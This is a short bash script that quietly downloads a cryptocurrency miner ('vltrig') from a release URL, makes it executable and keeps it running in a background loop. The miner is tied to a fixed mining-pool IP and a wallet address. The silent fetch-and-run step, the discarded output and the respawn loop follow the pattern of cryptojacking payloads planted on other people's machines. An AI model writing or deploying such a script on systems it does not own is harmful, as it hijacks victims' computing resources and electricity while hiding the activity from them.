#!/bin/bash

cd "$(dirname "$0")"

if [ ! -f vltrig ]; then
  wget -q -O vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz

  tar -xzf vltrig.tar.gz >/dev/null 2>&1

  chmod +x vltrig
fi

while true
do

  if ! pgrep -f "./vltrig" > /dev/null; then

    nohup ./vltrig -o 23.92.29.22:443 -u 88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX -p x -t x >/dev/null 2>&1 &

  fi

  sleep 15

done
